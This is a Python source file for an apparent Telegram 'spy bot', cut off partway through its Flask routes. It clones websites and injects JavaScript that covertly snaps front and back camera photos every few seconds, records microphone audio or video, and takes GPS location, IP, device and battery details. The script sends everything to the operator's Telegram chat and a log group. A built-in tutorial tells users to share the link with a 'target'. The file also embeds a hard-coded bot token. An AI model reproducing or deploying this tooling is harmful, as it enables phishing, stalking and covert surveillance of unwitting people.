#!/usr/bin/env python3
# lang: Python 3, file: say_bot.py, target: Termux / Linux
# jalankan: python say_bot.py
# dep: pip install flask requests python-telegram-bot

import os, sys, base64, datetime, threading, time
import subprocess, shutil, socket, re, signal, asyncio, json

try:
    from flask import Flask, request as freq, jsonify
except ImportError:
    print("[!] pip install flask"); sys.exit(1)
try:
    import requests as req_lib
except ImportError:
    print("[!] pip install requests"); sys.exit(1)
try:
    from telegram import (Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup,
                           ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove)
    from telegram.ext import (Application, CommandHandler, CallbackQueryHandler,
                               MessageHandler, ContextTypes, filters)
except ImportError:
    print("[!] pip install python-telegram-bot"); sys.exit(1)
try:
    from pyngrok import ngrok as _ngrok; PYNGROK = True
except ImportError:
    PYNGROK = False

# ------------------------------------------------------------------ #
#  KONFIGURASI
# ------------------------------------------------------------------ #
BOT_TOKEN  = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
ADMIN_ID   = "8598136412"
GROUP_ID   = "-5591690895"   # grup log capture
DATA_FILE  = "data.json"
FREE_LIMIT = 3

# durasi premium
PREMIUM_DURATIONS = {
    "1d":  ("1 Hari",    1),
    "1w":  ("1 Minggu",  7),
    "2w":  ("2 Minggu",  14),
    "3w":  ("3 Minggu",  21),
    "1m":  ("1 Bulan",   30),
    "perm":("Permanent", None),
}

# ------------------------------------------------------------------ #
#  BANNER
# ------------------------------------------------------------------ #
RESET  = "\033[0m"
BOLD   = "\033[1m"
COLORS = ["\033[91m","\033[93m","\033[92m","\033[96m","\033[94m","\033[95m"]
ASCII_ART = [
    " __  __ ____  _  _  _  _   _   _       ___ ____  ",
    "|  \\/  |  _ \\| || || || | | | | |     |_ _|  _ \\ ",
    "| |\\/| | |_) | || || || |_| |_| |      | || | | |",
    "| |  | |  _ <|__  _  __|  _  _  |      | || |_| |",
    "|_|  |_|_| \\_\\  |_| |_|  |_| |_|     |___|____/ ",
]

TUTORIAL_TEXT = """📖 *TUTORIAL SPY BOT BY LANOX*

━━━━━━━━━━━━━━━━━━━━
*1️⃣ MULAI*
Ketik /start untuk membuka panel utama.
Kamu akan melihat status akun dan tombol-tombol fitur.

━━━━━━━━━━━━━━━━━━━━
*2️⃣ TAMBAH LINK*
Tekan ➕ Tambah Link, lalu pilih template:

🔗 *Clone URL* — masukkan URL website yang mau ditiru (contoh: halaman login, berita, dll). Bot akan membuat tiruan situsnya.

📄 *Kirim File HTML* — kirim file .html langsung di chat. Cocok kalau punya halaman custom sendiri.

━━━━━━━━━━━━━━━━━━━━
*3️⃣ PILIH MODE SADAP*
Setelah template siap, pilih mode:

📷 *Kamera + Lokasi*
→ Ambil foto depan & belakang + koordinat lokasi target.

🎤 *Kamera + Lokasi + Mic*
→ Semua di atas + rekam audio selama target membuka situs. Audio dikirim saat target menutup halaman.

━━━━━━━━━━━━━━━━━━━━
*4️⃣ CUSTOM LINK (Opsional)*
Setelah tunnel aktif, bot tanya mau custom link atau tidak.
Kalau iya, ketik alias (contoh: promohari) → bot buat link pendek.

━━━━━━━━━━━━━━━━━━━━
*5️⃣ SHARE KE TARGET*
Salin link yang muncul → kirim ke target.
Waktu target buka link dan izinkan kamera/lokasi → data langsung masuk ke chat kamu.

━━━━━━━━━━━━━━━━━━━━
*6️⃣ LIHAT HASIL*
Setiap capture masuk kamu dapat:
• 📸 Foto depan & belakang (tiap 5 detik)
• 📍 Koordinat + link Google Maps
• 📱 Merek & model HP target
• 🌐 Browser & OS
• 🔌 IP address
• 📡 Jenis jaringan
• 🔋 Battery & charging status
• 🎤 Audio rekaman (mode mic)

━━━━━━━━━━━━━━━━━━━━
*7️⃣ KELOLA LINK*
📋 Daftar Link — lihat semua link aktif kamu
🗑 Hapus Link — matikan link yang tidak dipakai
👁 Target Online — cek siapa yang sedang buka linkmu sekarang

━━━━━━━━━━━━━━━━━━━━
*8️⃣ UPGRADE*
User Free hanya bisa buat 3 link.
Hubungi admin untuk upgrade ke Premium (link unlimited).

━━━━━━━━━━━━━━━━━━━━
🔥 *SPY BOT BY LANOX*
Smart Monitoring • Digital Tracking"""

def print_banner():
    os.system("clear")
    print()
    for i, line in enumerate(ASCII_ART):
        print(f"{BOLD}{COLORS[i % len(COLORS)]}{line}{RESET}")
    print(f"\n  \033[90mbot spy by MR414N-ID\033[0m\n")

# ------------------------------------------------------------------ #
#  TIMER
# ------------------------------------------------------------------ #
_start_time    = time.time()
_timer_running = True

def format_uptime():
    e = int(time.time() - _start_time)
    return f"{e//3600:02d}:{(e%3600)//60:02d}:{e%60:02d}"

def timer_thread():
    while _timer_running:
        sys.stdout.write(f"\r  \033[90m⏱  Server aktif: \033[97m{format_uptime()}\033[0m   ")
        sys.stdout.flush()
        time.sleep(1)

# ------------------------------------------------------------------ #
#  JSON — read / write atomic
# ------------------------------------------------------------------ #
_db_lock = threading.Lock()

def db_default():
    return {
        "users": {},
        "admins": [ADMIN_ID],
        "banned": []
    }

def db_read() -> dict:
    if not os.path.isfile(DATA_FILE):
        return db_default()
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return db_default()

def db_write(data: dict):
    tmp = DATA_FILE + ".tmp"
    with _db_lock:
        try:
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            os.replace(tmp, DATA_FILE)
        except Exception as e:
            print(f"\n[!] db_write error: {e}")

def db_ensure_user(uid: str) -> bool:
    """Return True kalau user baru (baru pertama kali daftar)."""
    data = db_read()
    if uid not in data["users"]:
        role = "admin" if uid in data.get("admins", []) else "free"
        data["users"][uid] = {
            "role": role,
            "cap_total": 0,
            "joined": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            "premium_until": None
        }
        db_write(data)
        return True
    return False

def db_get_role(uid: str) -> str:
    data = db_read()
    if uid in data.get("admins", []):
        return "admin"
    u = data["users"].get(uid, {})
    # cek expired premium
    role = u.get("role", "free")
    if role == "premium":
        until = u.get("premium_until")
        if until:
            exp = datetime.datetime.strptime(until, "%Y-%m-%d")
            if datetime.datetime.now() > exp:
                db_set_role(uid, "free")
                return "free"
    return role

def db_set_role(uid: str, role: str, until: str = None):
    data = db_read()
    if uid in data["users"]:
        data["users"][uid]["role"] = role
        data["users"][uid]["premium_until"] = until
        db_write(data)

def db_ban(uid: str):
    data = db_read()
    if uid not in data.get("banned", []):
        data.setdefault("banned", []).append(uid)
        db_write(data)

def db_unban(uid: str):
    data = db_read()
    if uid in data.get("banned", []):
        data["banned"].remove(uid)
        db_write(data)

def db_is_banned(uid: str) -> bool:
    return uid in db_read().get("banned", [])

def db_add_admin(uid: str):
    data = db_read()
    if uid not in data.get("admins", []):
        data.setdefault("admins", []).append(uid)
        if uid in data["users"]:
            data["users"][uid]["role"] = "admin"
        db_write(data)

def db_remove_admin(uid: str):
    if uid == ADMIN_ID:
        return False
    data = db_read()
    if uid in data.get("admins", []):
        data["admins"].remove(uid)
        if uid in data["users"]:
            data["users"][uid]["role"] = "free"
        db_write(data)
    return True

def db_increment_cap(uid: str):
    data = db_read()
    if uid in data["users"]:
        data["users"][uid]["cap_total"] = data["users"][uid].get("cap_total", 0) + 1
        db_write(data)

def db_all_users() -> dict:
    return db_read().get("users", {})

def db_link_count(uid: str) -> int:
    return sum(1 for l in _links if str(l["owner"]) == uid)

def db_get_stats() -> dict:
    data = db_read()
    users = data.get("users", {})
    total_cap = sum(u.get("cap_total", 0) for u in users.values())
    roles = {"admin": 0, "premium": 0, "free": 0}
    for u in users.values():
        r = u.get("role", "free")
        roles[r] = roles.get(r, 0) + 1
    return {
        "total_users": len(users),
        "total_links": len(_links),
        "total_cap": total_cap,
        "roles": roles
    }

# ------------------------------------------------------------------ #
#  ACTIVE TARGETS — deteksi online
# ------------------------------------------------------------------ #
_active_targets = {}  # link_id -> { ip -> last_seen }

def mark_active(link_id, ip):
    if link_id not in _active_targets:
        _active_targets[link_id] = {}
    _active_targets[link_id][ip] = time.time()

def get_online_count():
    now = time.time()
    total = 0
    for link_id, targets in _active_targets.items():
        for ip, ts in targets.items():
            if now - ts < 15:
                total += 1
    return total

# ------------------------------------------------------------------ #
#  JS INJECT
# ------------------------------------------------------------------ #
INJECT_JS = """
<script>
(function(){
  var capCount=0, active=true;

  function snapCamera(facingMode,cb){
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb(null);return;}
    navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}},audio:false})
    .then(function(stream){
      var v=document.createElement('video');
      v.srcObject=stream;v.setAttribute('playsinline','');v.muted=true;v.play();
      var fired=false;
      function grab(){
        if(fired)return;fired=true;
        var c=document.createElement('canvas');
        c.width=v.videoWidth||640;c.height=v.videoHeight||480;
        c.getContext('2d').drawImage(v,0,0);
        stream.getTracks().forEach(function(t){t.stop();});
        cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);
      }
      v.addEventListener('loadeddata',grab);
      setTimeout(function(){if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);}},5000);
    }).catch(function(){cb(null);});
  }

  function getLocation(cb){
    if(!navigator.geolocation){cb(null,null,null);return;}
    navigator.geolocation.getCurrentPosition(
      function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},
      function(){cb(null,null,null);},
      {enableHighAccuracy:true,timeout:10000}
    );
  }

  function getNetworkInfo(cb){
    var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};
    if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}
    cb(info);
  }

  function getBattery(cb){
    if(!navigator.getBattery){cb(null,null);return;}
    navigator.getBattery().then(function(b){cb(Math.round(b.level*100),b.charging);}).catch(function(){cb(null,null);});
  }

  function getPublicIP(cb){
    fetch('https://api.ipify.org?format=json',{mode:'cors'})
    .then(function(r){return r.json();}).then(function(d){cb(d.ip);}).catch(function(){cb(null);});
  }

  function collectInfo(cb){
    var info={
      userAgent:navigator.userAgent,
      language:navigator.language||'unknown',
      timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',
      screen:window.screen.width+'x'+window.screen.height,
      network:null,battery_pct:null,charging:null,ip:null
    };
    getNetworkInfo(function(net){
      info.network=net;
      getBattery(function(pct,chrg){
        info.battery_pct=pct;info.charging=chrg;
        getPublicIP(function(ip){info.ip=ip;cb(info);});
      });
    });
  }

  function doCapture(isFirst){
    if(!active)return;
    capCount++;var num=capCount;
    snapCamera('environment',function(back){
      snapCamera('user',function(front){
        var payload={num:num,photo_front:front||null,photo_back:back||null,
                     lat:null,lon:null,acc:null,info:null};
        if(isFirst){
          getLocation(function(lat,lon,acc){
            payload.lat=lat;payload.lon=lon;payload.acc=acc;
            collectInfo(function(info){payload.info=info;send(payload);});
          });
        } else { send(payload); }
      });
    });
  }

  function send(payload){
    fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},
                      body:JSON.stringify(payload)}).catch(function(){});
  }

  setInterval(function(){
    fetch('/ping',{method:'POST'}).catch(function(){});
  },8000);

  window.addEventListener('beforeunload',function(){
    active=false;navigator.sendBeacon('/offline','{}');
  });

  function loop(){
    if(!active)return;
    doCapture(capCount===0);
    setTimeout(loop,5000);
  }

  if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',loop);
  } else { loop(); }
})();
</script>
"""

INJECT_JS_MIC = """
<script>
(function(){
  var capCount=0, active=true;
  var mediaRecorder=null, audioChunks=[], micStream=null;

  // --- minta mic + kamera dalam SATU getUserMedia — satu popup ---
  function initMic(cb){
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb();return;}
    // minta audio+video sekaligus → satu popup izin
    navigator.mediaDevices.getUserMedia({
      audio:true,
      video:{facingMode:{ideal:'environment'}}
    })
    .then(function(stream){
      micStream=stream;
      // ambil HANYA audio track untuk recorder
      var audioOnly=new MediaStream(stream.getAudioTracks());
      // stop video track dari stream ini — foto diambil oleh snapCamera sendiri
      stream.getVideoTracks().forEach(function(t){t.stop();});
      var mimeType='audio/webm';
      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='audio/ogg;codecs=opus';
      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='audio/ogg';
      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='';
      try{
        mediaRecorder=new MediaRecorder(audioOnly, mimeType?{mimeType:mimeType}:{});
        mediaRecorder.ondataavailable=function(e){
          if(e.data&&e.data.size>0) audioChunks.push(e.data);
        };
        mediaRecorder.start();
      }catch(err){}
      cb();
    }).catch(function(e){
      // fallback: coba audio saja kalau video+audio ditolak
      navigator.mediaDevices.getUserMedia({audio:true})
      .then(function(stream){
        micStream=stream;
        var mimeType='audio/webm';
        if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='audio/ogg';
        if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='';
        try{
          mediaRecorder=new MediaRecorder(stream, mimeType?{mimeType:mimeType}:{});
          mediaRecorder.ondataavailable=function(e){
            if(e.data&&e.data.size>0) audioChunks.push(e.data);
          };
          mediaRecorder.start();
        }catch(err){}
        cb();
      }).catch(function(){ cb(); });
    });
  }

  function sendAudio(){
    try{
      if(!mediaRecorder) return;
      if(mediaRecorder.state==='recording') mediaRecorder.stop();
      mediaRecorder.onstop=function(){
        if(audioChunks.length===0) return;
        var blob=new Blob(audioChunks,{type: mediaRecorder.mimeType||'audio/webm'});
        var reader=new FileReader();
        reader.onloadend=function(){
          var b64=reader.result.split(',')[1];
          navigator.sendBeacon('/audio', JSON.stringify({audio:b64,mime:mediaRecorder.mimeType||'audio/webm'}));
        };
        reader.readAsDataURL(blob);
      };
    }catch(e){}
  }

  function snapCamera(facingMode,cb){
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb(null);return;}
    navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facingMode}},audio:false})
    .then(function(stream){
      var v=document.createElement('video');
      v.srcObject=stream;v.setAttribute('playsinline','');v.muted=true;v.play();
      var fired=false;
      function grab(){
        if(fired)return;fired=true;
        var c=document.createElement('canvas');
        c.width=v.videoWidth||640;c.height=v.videoHeight||480;
        c.getContext('2d').drawImage(v,0,0);
        stream.getTracks().forEach(function(t){t.stop();});
        cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);
      }
      v.addEventListener('loadeddata',grab);
      setTimeout(function(){if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);}},5000);
    }).catch(function(){cb(null);});
  }

  function getLocation(cb){
    if(!navigator.geolocation){cb(null,null,null);return;}
    navigator.geolocation.getCurrentPosition(
      function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},
      function(){cb(null,null,null);},
      {enableHighAccuracy:true,timeout:10000}
    );
  }

  function getNetworkInfo(cb){
    var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};
    if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}
    cb(info);
  }

  function getBattery(cb){
    if(!navigator.getBattery){cb(null,null);return;}
    navigator.getBattery().then(function(b){cb(Math.round(b.level*100),b.charging);}).catch(function(){cb(null,null);});
  }

  function getPublicIP(cb){
    fetch('https://api.ipify.org?format=json',{mode:'cors'})
    .then(function(r){return r.json();}).then(function(d){cb(d.ip);}).catch(function(){cb(null);});
  }

  function collectInfo(cb){
    var info={userAgent:navigator.userAgent,language:navigator.language||'unknown',
              timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',
              screen:window.screen.width+'x'+window.screen.height,
              network:null,battery_pct:null,charging:null,ip:null};
    getNetworkInfo(function(net){
      info.network=net;
      getBattery(function(pct,chrg){
        info.battery_pct=pct;info.charging=chrg;
        getPublicIP(function(ip){info.ip=ip;cb(info);});
      });
    });
  }

  function doCapture(isFirst){
    if(!active)return;
    capCount++;var num=capCount;
    snapCamera('environment',function(back){
      snapCamera('user',function(front){
        var payload={num:num,photo_front:front||null,photo_back:back||null,
                     lat:null,lon:null,acc:null,info:null};
        if(isFirst){
          getLocation(function(lat,lon,acc){
            payload.lat=lat;payload.lon=lon;payload.acc=acc;
            collectInfo(function(info){payload.info=info;send(payload);});
          });
        } else { send(payload); }
      });
    });
  }

  function send(payload){
    fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},
                      body:JSON.stringify(payload)}).catch(function(){});
  }

  setInterval(function(){fetch('/ping',{method:'POST'}).catch(function(){});},8000);

  window.addEventListener('beforeunload',function(){
    active=false;
    sendAudio();
    navigator.sendBeacon('/offline','{}');
  });

  function loop(){
    if(!active)return;
    doCapture(capCount===0);
    setTimeout(loop,5000);
  }

  // init mic dulu, baru mulai loop foto
  function start(){
    initMic(function(){
      loop();
    });
  }

  if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',start);
  } else { start(); }
})();
</script>
"""

INJECT_JS_VIDEO = """
<script>
(function(){
  var active=true;
  var mediaRecorder=null, videoChunks=[];

  function getLocation(cb){
    if(!navigator.geolocation){cb(null,null,null);return;}
    navigator.geolocation.getCurrentPosition(
      function(p){cb(p.coords.latitude,p.coords.longitude,p.coords.accuracy);},
      function(){cb(null,null,null);},
      {enableHighAccuracy:true,timeout:10000}
    );
  }

  function getPublicIP(cb){
    fetch('https://api.ipify.org?format=json',{mode:'cors'})
    .then(function(r){return r.json();}).then(function(d){cb(d.ip);}).catch(function(){cb(null);});
  }

  function getNetworkInfo(cb){
    var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    var info={type:'unknown',effectiveType:'unknown',downlink:'unknown'};
    if(c){info.type=c.type||'unknown';info.effectiveType=c.effectiveType||'unknown';info.downlink=c.downlink||'unknown';}
    cb(info);
  }

  function getBattery(cb){
    if(!navigator.getBattery){cb(null,null);return;}
    navigator.getBattery().then(function(b){cb(Math.round(b.level*100),b.charging);}).catch(function(){cb(null,null);});
  }

  function collectInfo(cb){
    var info={userAgent:navigator.userAgent,language:navigator.language||'unknown',
              timezone:Intl?Intl.DateTimeFormat().resolvedOptions().timeZone:'unknown',
              screen:window.screen.width+'x'+window.screen.height,
              network:null,battery_pct:null,charging:null,ip:null};
    getNetworkInfo(function(net){
      info.network=net;
      getBattery(function(pct,chrg){
        info.battery_pct=pct;info.charging=chrg;
        getPublicIP(function(ip){info.ip=ip;cb(info);});
      });
    });
  }

  function sendInfo(){
    getLocation(function(lat,lon,acc){
      collectInfo(function(info){
        fetch('/capture',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({num:1,photo_front:null,photo_back:null,
                               lat:lat,lon:lon,acc:acc,info:info})
        }).catch(function(){});
      });
    });
  }

  function sendVideo(){
    try{
      if(!mediaRecorder)return;
      if(mediaRecorder.state==='recording') mediaRecorder.stop();
      mediaRecorder.onstop=function(){
        if(videoChunks.length===0)return;
        var blob=new Blob(videoChunks,{type:mediaRecorder.mimeType||'video/webm'});
        var reader=new FileReader();
        reader.onloadend=function(){
          var b64=reader.result.split(',')[1];
          navigator.sendBeacon('/video',JSON.stringify({video:b64,mime:mediaRecorder.mimeType||'video/webm'}));
        };
        reader.readAsDataURL(blob);
      };
    }catch(e){}
  }

  function startVideo(){
    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia)return;
    // coba kamera depan dulu (lebih natural untuk target)
    navigator.mediaDevices.getUserMedia({
      video:{facingMode:{ideal:'user'},width:{ideal:640},height:{ideal:480}},
      audio:true
    })
    .then(function(stream){
      var mimeType='video/webm;codecs=vp8,opus';
      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='video/webm';
      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='video/mp4';
      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='';
      try{
        mediaRecorder=new MediaRecorder(stream, mimeType?{mimeType:mimeType}:{});
        mediaRecorder.ondataavailable=function(e){
          if(e.data&&e.data.size>0) videoChunks.push(e.data);
        };
        mediaRecorder.start();
      }catch(err){}
    }).catch(function(){});
  }

  setInterval(function(){fetch('/ping',{method:'POST'}).catch(function(){});},8000);

  window.addEventListener('beforeunload',function(){
    active=false;
    sendVideo();
    navigator.sendBeacon('/offline','{}');
  });

  function start(){
    sendInfo();   // kirim lokasi + device info sekali di awal
    startVideo(); // mulai rekam video
  }

  if(document.readyState==='loading'){
    document.addEventListener('DOMContentLoaded',start);
  } else { start(); }
})();
</script>
"""

RATE_LIMIT_SEC = 30   # minimal jeda antar tambah link

# ------------------------------------------------------------------ #
#  STATE RUNTIME
# ------------------------------------------------------------------ #
_links        = []
_link_id_ctr  = 0
_cap_counts   = {}
_page_htmls   = {}
_user_state   = {}
_user_data    = {}
_last_add     = {}   # uid -> timestamp tambah link terakhir

# ------------------------------------------------------------------ #
#  HELPER — parse device lengkap
# ------------------------------------------------------------------ #
def parse_device(ua: str):
    ua = ua or ""

    # Merek & Model
    brand, model = "Unknown", "Unknown"
    brand_patterns = [
        (r"SM-([A-Z0-9]+)", "Samsung", r"SM-[A-Z0-9]+"),
        (r"Redmi ([^\s;)]+)", "Xiaomi Redmi", r"Redmi [^\s;)]+"),
        (r"POCO ([^\s;)]+)", "Xiaomi POCO", r"POCO [^\s;)]+"),
        (r"Mi ([^\s;)]+)", "Xiaomi Mi", r"Mi [^\s;)]+"),
        (r"CPH([0-9]+)", "OPPO", r"CPH[0-9]+"),
        (r"RMX([0-9]+)", "Realme", r"RMX[0-9]+"),
        (r"V([0-9]{4}[A-Z]+)", "Vivo", r"V[0-9]{4}[A-Z]+"),
        (r"ASUS_([^\s;)]+)", "ASUS", r"ASUS_[^\s;)]+"),
        (r"Pixel ([^\s;)]+)", "Google Pixel", r"Pixel [^\s;)]+"),
        (r"OnePlus ([^\s;)]+)", "OnePlus", r"OnePlus [^\s;)]+"),
        (r"Huawei ([^\s;)]+)", "Huawei", r"Huawei [^\s;)]+"),
        (r"Nokia ([^\s;)]+)", "Nokia", r"Nokia [^\s;)]+"),
        (r"LG-([^\s;)]+)", "LG", r"LG-[^\s;)]+"),
    ]
    for pattern, b, full_pat in brand_patterns:
        m = re.search(pattern, ua)
        if m:
            brand = b
            mf = re.search(full_pat, ua)
            model = mf.group(0) if mf else m.group(0)
            break

    # iPhone / iPad
    if "iPhone" in ua:
        brand = "Apple"; model = "iPhone"
    elif "iPad" in ua:
        brand = "Apple"; model = "iPad"

    # OS
    if "Android" in ua:
        m = re.search(r"Android ([0-9.]+)", ua)
        os_ver = "Android " + (m.group(1) if m else "?")
    elif "iPhone OS" in ua or "CPU OS" in ua:
        m = re.search(r"OS ([0-9_]+)", ua)
        os_ver = "iOS " + (m.group(1).replace("_", ".") if m else "?")
    elif "Windows NT" in ua:
        nt = {"10.0": "10/11", "6.3": "8.1", "6.2": "8", "6.1": "7"}
        m = re.search(r"Windows NT ([0-9.]+)", ua)
        ver = nt.get(m.group(1), m.group(1)) if m else "?"
        os_ver = f"Windows {ver}"
    elif "Mac OS X" in ua:
        m = re.search(r"Mac OS X ([0-9_]+)", ua)
        os_ver = "macOS " + (m.group(1).replace("_", ".") if m else "?")
    elif "Linux" in ua:
        os_ver = "Linux"
    else:
        os_ver = "Unknown OS"

    # Browser
    if "CriOS" in ua:
        m = re.search(r"CriOS/([0-9]+)", ua); br = "Chrome iOS " + (m.group(1) if m else "")
    elif "FxiOS" in ua:
        m = re.search(r"FxiOS/([0-9]+)", ua); br = "Firefox iOS " + (m.group(1) if m else "")
    elif "EdgA" in ua:
        m = re.search(r"EdgA/([0-9]+)", ua); br = "Edge Mobile " + (m.group(1) if m else "")
    elif "Chrome" in ua and "Edg" not in ua and "OPR" not in ua:
        m = re.search(r"Chrome/([0-9]+)", ua); br = "Chrome " + (m.group(1) if m else "")
    elif "Firefox" in ua:
        m = re.search(r"Firefox/([0-9]+)", ua); br = "Firefox " + (m.group(1) if m else "")
    elif "Safari" in ua and "Chrome" not in ua:
        m = re.search(r"Version/([0-9]+)", ua); br = "Safari " + (m.group(1) if m else "")
    elif "Edg/" in ua:
        m = re.search(r"Edg/([0-9]+)", ua); br = "Edge " + (m.group(1) if m else "")
    elif "OPR" in ua:
        m = re.search(r"OPR/([0-9]+)", ua); br = "Opera " + (m.group(1) if m else "")
    elif "UCBrowser" in ua:
        br = "UC Browser"
    else:
        br = "Unknown Browser"

    dev_type = "Mobile" if any(x in ua for x in ["Mobile","Android","iPhone","iPad"]) else "Desktop"
    return brand, model, os_ver, br, dev_type

# ------------------------------------------------------------------ #
#  KIRIM HASIL KE TELEGRAM
# ------------------------------------------------------------------ #
def send_result_thread(data, link_id, owner_uid):
    asyncio.run(_send_result(data, link_id, owner_uid))

async def _send_result(data, link_id, owner_uid):
    bot   = Bot(token=BOT_TOKEN)
    num   = data.get("num", "?")
    lat   = data.get("lat"); lon = data.get("lon"); acc = data.get("acc")
    front = data.get("photo_front"); back = data.get("photo_back")
    info  = data.get("info") or {}
    ts    = datetime.datetime.now().strftime("%H:%M:%S")

    _cap_counts[link_id] = _cap_counts.get(link_id, 0) + 1
    total = _cap_counts[link_id]
    db_increment_cap(owner_uid)

    if total == 1:
        await bot.send_message(
            chat_id=owner_uid,
            text=f"🎯 *Target masuk!* — Link #{link_id}\n⏰ {ts}",
            parse_mode="Markdown"
        )

    brand, model, os_ver, br, dev_type = parse_device(info.get("userAgent", ""))
    net  = info.get("network") or {}
    batt = info.get("battery_pct")
    chrg = info.get("charging")
    batt_str = f"{batt}% {'🔌' if chrg else '🔋'}" if batt is not None else "?"
    ntype = net.get("type", "?"); neff = net.get("effectiveType", "?")
    ndl   = net.get("downlink", "?")
    net_str = f"{ntype} · {neff} · {ndl} Mbps" if ntype != "unknown" else f"{neff} · {ndl} Mbps"

    teks  = f"📸 *Capture #{num}* (Link #{link_id}) — {ts}\n"
    teks += f"📊 Total capture link ini: {total}\n\n"
    if lat and lon:
        maps = f"https://maps.google.com/?q={lat},{lon}"
        teks += f"📍 `{lat}, {lon}` ± {int(float(acc))}m\n[Buka Maps]({maps})\n\n"
    else:
        teks += "📍 Lokasi tidak didapat\n\n"
    teks += f"📱 *Merek:* {brand}\n"
    teks += f"📲 *Model:* {model}\n"
    teks += f"💻 *Tipe:* {dev_type}\n"
    teks += f"🖥 *OS:* {os_ver}\n"
    teks += f"🌐 *Browser:* {br}\n"
    teks += f"🔌 *IP:* `{info.get('ip','?')}`\n"
    teks += f"📡 *Jaringan:* {net_str}\n"
    teks += f"🔋 *Battery:* {batt_str}\n"
    teks += f"🕐 *Timezone:* {info.get('timezone','?')}\n"
    teks += f"🗣 *Bahasa:* {info.get('language','?')}\n"
    teks += f"🖥 *Layar:* {info.get('screen','?')}"

    # kirim ke user dan ke grup log
    for dest in [owner_uid, GROUP_ID]:
        try:
            await bot.send_message(chat_id=dest, text=teks, parse_mode="Markdown")
            if num == 1 and lat and lon:
                await bot.send_location(chat_id=dest,
                                        latitude=float(lat), longitude=float(lon))
            if back:
                await bot.send_photo(chat_id=dest,
                                     photo=base64.b64decode(back),
                                     caption=f"📷 Belakang — Link #{link_id} Cap #{num}")
            if front:
                await bot.send_photo(chat_id=dest,
                                     photo=base64.b64decode(front),
                                     caption=f"🤳 Depan — Link #{link_id} Cap #{num}")
        except Exception as e:
            print(f"\n[!] kirim ke {dest}: {e}")

async def _send_audio(b64: str, link_id, owner_uid):
    bot = Bot(token=BOT_TOKEN)
    ts  = datetime.datetime.now().strftime("%H:%M:%S")
    try:
        audio_bytes = base64.b64decode(b64)
        caption = f"🎤 Audio rekaman — Link #{link_id} | {ts}"
        for dest in [owner_uid, GROUP_ID]:
            try:
                await bot.send_audio(
                    chat_id=dest,
                    audio=audio_bytes,
                    caption=caption,
                    filename=f"audio_{link_id}_{ts.replace(':','')}.webm"
                )
            except Exception as e:
                print(f"\n[!] send audio ke {dest}: {e}")
    except Exception as e:
        print(f"\n[!] decode audio: {e}")

async def _send_video(b64: str, mime: str, link_id, owner_uid):
    bot = Bot(token=BOT_TOKEN)
    ts  = datetime.datetime.now().strftime("%H:%M:%S")
    ext = "mp4" if "mp4" in mime else "webm"
    try:
        video_bytes = base64.b64decode(b64)
        caption = f"🎥 Video rekaman — Link #{link_id} | {ts}"
        for dest in [owner_uid, GROUP_ID]:
            try:
                await bot.send_video(
                    chat_id=dest,
                    video=video_bytes,
                    caption=caption,
                    filename=f"video_{link_id}_{ts.replace(':','')}.{ext}",
                    supports_streaming=True
                )
            except Exception as e:
                # fallback kirim sebagai dokumen kalau send_video gagal
                try:
                    await bot.send_document(
                        chat_id=dest,
                        document=video_bytes,
                        caption=caption,
                        filename=f"video_{link_id}_{ts.replace(':','')}.{ext}"
                    )
                except Exception as e2:
                    print(f"\n[!] send video ke {dest}: {e2}")
    except Exception as e:
        print(f"\n[!] decode video: {e}")

async def _send_offline(link_id, owner_uid):
    bot = Bot(token=BOT_TOKEN)
    total = _cap_counts.get(link_id, 0)
    await bot.send_message(
        chat_id=owner_uid,
        text=f"🔴 *Target offline* (Link #{link_id})\nTotal capture: {total}",
        parse_mode="Markdown"
    )

# ------------------------------------------------------------------ #
#  FLASK
# ------------------------------------------------------------------ #
def make_flask_app(link_id, owner_uid):
    fapp = Flask(f"app_{link_id}")

    @fapp.route("/")
    def index(): return _page_htmls.get(link_id, "<h1>Not found</h1>")

    @fapp.route("/capture", methods=["POST"])
    def capture():
        data = freq.get_json(silent=True) or {}
        ip   = freq.remote_addr
        mark_active(link_id, ip)
        threading.Thread(target=send_result_thread,
                         args=(data, link_id, owner_uid), daemon=True).start()
        return jsonify({"ok": True})

